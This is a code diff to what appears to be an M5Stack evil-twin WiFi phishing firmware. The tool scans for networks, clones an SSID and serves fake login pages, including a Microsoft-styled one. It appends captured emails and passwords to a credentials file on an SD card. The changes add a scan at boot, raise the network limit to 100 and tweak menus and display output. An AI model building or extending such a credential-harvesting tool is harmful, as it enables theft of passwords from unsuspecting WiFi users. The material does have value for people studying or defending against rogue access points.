@@ -12,9 +12,9 @@ const byte DNS_PORT = 53;
 
 int currentIndex = 0, lastIndex = -1;
 bool inMenu = true;
-const char* menuItems[] = {"Scan WiFi", "Select Network", "WiFi Details" , "Start Captive Portal", "Stop Captive Portal" , "Change portal", "Check credentials", "Delete Credentials" };
+const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change portal", "Check credentials", "Delete Credentials" };
 const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
-String ssidList[30];
+String ssidList[100];
 int numSsid = 0;
 bool isOperationInProgress = false;
 int currentListIndex = 0;
@@ -23,7 +23,7 @@ String clonedSSID = "";  // Pour stocker le SSID cloné
 
 String portalFiles[10]; // Supposons que vous avez au maximum 10 fichiers
 int numPortalFiles = 0;
-String selectedPortalFile = "/sites/microsoft.html"; // Fichier par défaut
+String selectedPortalFile = "/sites/normal.html"; // portail par défaut
 int portalFileIndex = 0; // Index du fichier actuellement sélectionné
 
 
@@ -51,16 +51,36 @@ void setup() {
   M5.Display.setCursor(80, textY + 20);
   M5.Display.println("By 7h30th3r0n3");
   // Ajouter un délai avant de passer à la suite du programme
-  delay(1000);
-   // Initialiser ssidList avec un SSID par défaut
-    ssidList[0] = "Scan before please";
-    numSsid = 1; // Mettre à jour le nombre de SSID dans la liste
+  fistScanWifiNetworks();
   if (!SD.begin(SDCARD_CSPIN, SPI, 25000000)) {
     Serial.println("Erreur d'initialisation de la carte SD");
     return;
   }
   Serial.println("Carte SD initialisée avec succès");
 
+}
+
+void fistScanWifiNetworks() {
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    unsigned long startTime = millis();
+    int n;
+    while (millis() - startTime < 5000) {
+        n = WiFi.scanNetworks();
+        if (n != WIFI_SCAN_RUNNING) break;
+    }
+
+    if (n == 0) {
+        Serial.println("Aucun réseau trouvé");
+    } else {
+        Serial.print(n);
+        Serial.println(" réseaux trouvés");
+        numSsid = min(n, 100); // Limiter le nombre de SSID à 30
+        for (int i = 0; i < numSsid; i++) {
+            ssidList[i] = WiFi.SSID(i);
+            Serial.println(ssidList[i]); // Afficher les SSID trouvés dans le moniteur série
+        }
+    }
 }
 
 void loop() {
@@ -162,7 +182,7 @@ void scanWifiNetworks() {
     n = WiFi.scanNetworks();
     if (n != WIFI_SCAN_RUNNING) break;
   }
-  numSsid = min(n, 30);
+  numSsid = min(n, 100);
   for (int i = 0; i < numSsid; i++) {
     ssidList[i] = WiFi.SSID(i);
   }
@@ -316,7 +336,7 @@ void createCaptivePortal() {
     });
 
     server.begin();
-    waitAndReturnToMenu("Portal\n" + ssid + "\nDeployed");
+    waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
 }
 
 void servePortalFile(const String& filename) {
@@ -332,7 +352,6 @@ void servePortalFile(const String& filename) {
 void saveCredentials(const String& email, const String& password) {
     File file = SD.open("/credentials.txt", FILE_APPEND);
     if (file) {
-        file.println("----------------------");
         file.println("Email: " + email);
         file.println("Password: " + password);
         file.println("----------------------");
@@ -481,7 +500,8 @@ void deleteCredentials() {
 void waitAndReturnToMenu(String message) {
   M5.Display.clear();
   M5.Display.setTextSize(2);
-  M5.Display.setCursor(30, M5.Display.height() / 2);
+  M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
+  M5.Display.setCursor(50 , M5.Display.height()/ 2 );
   M5.Display.println(message);
   M5.Display.display();
   delay(1000);
